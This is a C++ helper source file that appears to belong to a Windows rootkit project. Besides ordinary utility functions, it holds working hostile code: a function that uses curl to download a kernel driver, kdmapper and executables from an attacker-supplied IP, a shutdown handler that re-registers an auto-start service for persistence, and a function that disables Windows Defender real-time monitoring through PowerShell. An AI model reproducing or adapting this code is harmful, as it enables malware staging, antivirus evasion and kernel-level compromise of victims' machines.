#include "helpers.h"


std::uint32_t GetPID(std::string PrcName) {
	PROCESSENTRY32 PrcEntry;
	const UniqueHndl snapshot_handle(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL));  // take snapshot of all current processes
	if (snapshot_handle.get() == INVALID_HANDLE_VALUE) {
		return NULL; // invalid handle
	}
	PrcEntry.dwSize = sizeof(PROCESSENTRY32);  // set size of function process entry (after validating the given handle)
	while (Process32Next(snapshot_handle.get(), &PrcEntry) == TRUE) {
		std::wstring wideExeFile(PrcEntry.szExeFile);
		std::string narrowExeFile(wideExeFile.begin(), wideExeFile.end());

		if (strcmp(PrcName.c_str(), narrowExeFile.c_str()) == 0) {
			return PrcEntry.th32ProcessID;  // return the PID of the required process from the process snapshot
		}
	}
	return NULL;  // if something did not work correctly
}


BOOL ValidateInfoTypeString(const char* InfoType) {
	if (strlen(InfoType) > 5 || strlen(InfoType) == 0) {
		return FALSE;
	}

	std::string cppString("rbptcPieIL");
	for (int i = 0; InfoType[i] != '\0'; i++) {
		if (cppString.find(InfoType[i]) == std::string::npos) {
			return FALSE;
		}
	}
	return TRUE;
}


int CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString) {
    int WideNameLen = MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, NULL, 0);
    MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, ConvertedString, WideNameLen);
    return WideNameLen;
}


int WcharpToCharp(char* ConvertedString, const WCHAR* ConvertString) {
    int MultiByteLen = WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, NULL, 0, NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, ConvertedString, MultiByteLen, NULL, NULL);
    return MultiByteLen;
}


std::wstring GetCurrentPath() {
    TCHAR PathBuffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, PathBuffer, MAX_PATH);
    std::wstring::size_type PathEndPos = std::wstring(PathBuffer).find_last_of(L"\\/");
    return std::wstring(PathBuffer).substr(0, PathEndPos);
}


int CountOccurrences(const char* SearchStr, char SearchLetter) {
    DWORD Count = 0;
    for (int i = 0; i < strlen(SearchStr); i++) {
        if (SearchStr[i] == SearchLetter) {
            Count++;
        }
    }
    return Count;
}


void GetServiceName(char* Path, char* Buffer) {
    char TempBuffer[MAX_PATH] = { 0 };
    int bi = 0;
    int acbi = 0;
    int pi = (int)strlen(Path) - 1;

    for (; pi >= 0; pi--, bi++) {
        if (Path[pi] == '\\') {
            break;
        }
        TempBuffer[bi] = Path[pi];
    }
    TempBuffer[bi] = '\0';
    for (bi = (int)strlen(TempBuffer) - 1; bi >= 0; bi--, acbi++) {
        Buffer[acbi] = TempBuffer[bi];
    }
}


void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size) {
    int ii = 0;
    int repi = 0;
    int comi = 0;

    for (int i = 0; i <= strlen(BaseString); i++) {
        if (repi < Size && BaseString[i] == RepArr[repi].WhereTo) {
            memcpy((PVOID)((ULONG64)Output + comi), RepArr[repi].Replace, strlen(RepArr[repi].Replace));
            comi += strlen(RepArr[repi].Replace);

            RepArr[repi].RepCount -= 1;
            if (RepArr[repi].RepCount == 0) {
                repi++;
            }
        }
        else {
            Output[comi] = BaseString[i];
            comi++;
        }
    }
}


DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size) {
    char Command[500] = { 0 };
    ReplaceValues(BaseCommand, RepArr, Command, Size);
    if (system(Command) == -1) {
        return GetLastError();
    }
    return 0;
}


void GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension) {
    const char* Alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,;[]{}-_=+)(&^%$#@!~`";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distr(0, strlen(Alp) - 1);
    int i = 0;
    for (; i < (int)RandSize; i++) {
        NameBuf[i] = Alp[distr(gen)];
    }
    for (int exti = 0; exti <= strlen(Extension); exti++, i++) {
        NameBuf[i] = Extension[exti];
    }
}


int GetPidByName(const char* Name) {
    int ProcessId = 0;
    DWORD Procs[1024] = { 0 }, BytesReturned = 0, ProcessesNum = 0;
    char CurrentName[MAX_PATH] = { 0 };
    HANDLE CurrentProc = INVALID_HANDLE_VALUE;
    HMODULE CurrentProcMod = NULL;

    // Get the list of PIDs of all running processes -   
    if (!EnumProcesses(Procs, sizeof(Procs), &BytesReturned))
        return 0;
    ProcessesNum = BytesReturned / sizeof(DWORD);

    for (int i = 0; i < ProcessesNum; i++) {
        if (Procs[i] != 0) {
            CurrentProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Procs[i]);
            if (CurrentProc != NULL) {
                if (EnumProcessModules(CurrentProc, &CurrentProcMod, sizeof(CurrentProcMod), &BytesReturned)) {
                    GetModuleBaseNameA(CurrentProc, CurrentProcMod, CurrentName, sizeof(CurrentName) / sizeof(TCHAR));
                    if (lstrcmpiA(Name, CurrentName) == 0) {
                        ProcessId = Procs[i];
                        break;
                    }
                }
                CloseHandle(CurrentProc);
            }
        }
    }
    return ProcessId;
}


int CheckLetterInArr(char Chr, const char* Arr) {
    for (int i = 0; i < strlen(Arr); i++) {
        if (Arr[i] == Chr) {
            return i;
        }
    }
    return -1;
}


BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount) {
    int ActualSize = 1;
    int CurrRepIndex = 0;
    int ActualCommandIndex = 0;
    int SystemReturn = -1;

    for (int ci = 0; ci < CommandCount; ci++) {
        ActualSize += strlen(CommandArr[ci]);
        for (int si = 0; si < SymbolCount; si++) {
            ActualSize -= CountOccurrences(CommandArr[ci], Symbols[si]);
            for (int r = 0; r < CountOccurrences(CommandArr[ci], Symbols[si]); r++) {
                ActualSize += strlen(Replacements[si]);
            }
        }
    }

    char* ActualCommand = (char*)malloc(ActualSize);
    if (ActualCommand == NULL) {
        return FALSE;
    }

    for (int ci = 0; ci < CommandCount; ci++) {
        for (int cii = 0; cii < strlen(CommandArr[ci]); cii++) {
            CurrRepIndex = CheckLetterInArr(CommandArr[ci][cii], Symbols);
            if (CurrRepIndex == -1) {
                ActualCommand[ActualCommandIndex] = CommandArr[ci][cii];
                ActualCommandIndex++;
            }
            else {
                for (int ri = 0; ri < strlen(Replacements[CurrRepIndex]); ri++) {
                    ActualCommand[ActualCommandIndex] = Replacements[CurrRepIndex][ri];
                    ActualCommandIndex++;
                }
            }
        }
    }
    ActualCommand[ActualCommandIndex] = '\0';
    SystemReturn = system(ActualCommand);
    if (SystemReturn == -1) {
        free(ActualCommand);
        return FALSE;
    }
    free(ActualCommand);
    return TRUE;
}


int VerfifyDepDirs() {
    if (system("if not exist C:\\nosusfolder\\verysus\\KMDFdriver\\Release mkdir C:\\nosusfolder\\verysus\\KMDFdriver\\Release > nul") == -1 ||
        system("if not exist C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release mkdir C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release > nul") == -1) {
        return GetLastError();
    }
    return 0;
}


int VerfifyDepFiles(const char* AttackerIp) {
    const char* FileCommands[] = { "cd C:\\  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.sln curl http://~:8080/MainMedium/MainMedium.sln --output nosusfolder\\verysus\\MainMedium\\MainMedium.sln  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\medium.cpp curl http://~:8080/MainMedium/medium.cpp --output nosusfolder\\verysus\\MainMedium\\medium.cpp  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\medium.h curl http://~:8080/MainMedium/medium.h --output nosusfolder\\verysus\\MainMedium\\medium.h  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\rootreqs.cpp curl http://~:8080/MainMedium/rootreqs.cpp --output nosusfolder\\verysus\\MainMedium\\rootreqs.cpp  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\rootreqs.h curl http://~:8080/MainMedium/rootreqs.h --output nosusfolder\\verysus\\MainMedium\\rootreqs.h  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\internet.cpp curl http://~:8080/MainMedium/internet.cpp --output nosusfolder\\verysus\\MainMedium\\internet.cpp  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\internet.h curl http://~:8080/MainMedium/internet.h --output nosusfolder\\verysus\\MainMedium\\internet.h  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\helpers.cpp curl http://~:8080/MainMedium/helpers.cpp --output nosusfolder\\verysus\\MainMedium\\helpers.cpp  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\helpers.h curl http://~:8080/MainMedium/helpers.h --output nosusfolder\\verysus\\MainMedium\\helpers.h  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj curl http://~:8080/MainMedium/MainMedium.vcxproj --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters curl http://~:8080/MainMedium/MainMedium.vcxproj.filters --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user curl http://~:8080/MainMedium/MainMedium.vcxproj.user --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user  > nul && ",
        "if not exist nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe curl http://~:8080/MainMedium/x64/Release/MainMedium.exe --output nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe  > nul && ",
        "if not exist nosusfolder\\verysus\\AutoStart.exe curl http://~:8080/trypack/AutoStart/x64/Release/AutoStart.exe --output nosusfolder\\verysus\\AutoStart.exe  > nul && ",
        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys  > nul && ",
        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf  > nul && ",
        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb  > nul && ",
        "if not exist nosusfolder\\verysus\\kdmapper.exe curl http://~:8080/kdmapper/x64/Release/kdmapper.exe --output nosusfolder\\verysus\\kdmapper.exe" };
    const char* ReplaceArr[1] = { AttackerIp };
    const char* SymbolsArr = "~";
    const int TotalCommands = 19;
    if (!PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 1)) {
        return (int)GetLastError();
    }
    return 0;
}


BOOL WINAPI CtrlHandler(DWORD ControlType) {
    switch (ControlType) {
    case CTRL_SHUTDOWN_EVENT: 
        system("sc stop RootAuto");
        system("sc delete RootAuto");
        system("sc create RootAuto type=own start=auto binPath=\"C:\\nosusfolder\\verysus\\AutoStart.exe\"");
        return TRUE;
    default:
        return FALSE;
    }
}


RETURN_LAST RealTime(BOOL IsDisable) {
    RETURN_LAST LastError = { 0, ERROR_SUCCESS };
    const char* Disable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $true\" > nul";
    const char* Enable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $false\" > nul";
    if (IsDisable) {
        LastError.LastError = system(Disable);
    }
    else {
        LastError.LastError = system(Enable);
    }

    if (LastError.LastError == -1) {
        LastError.LastError = GetLastError();
        LastError.Represent = ERROR_GENERIC_COMMAND_FAILED;
        return LastError;
    }
    LastError.LastError = 0;
    return LastError;
}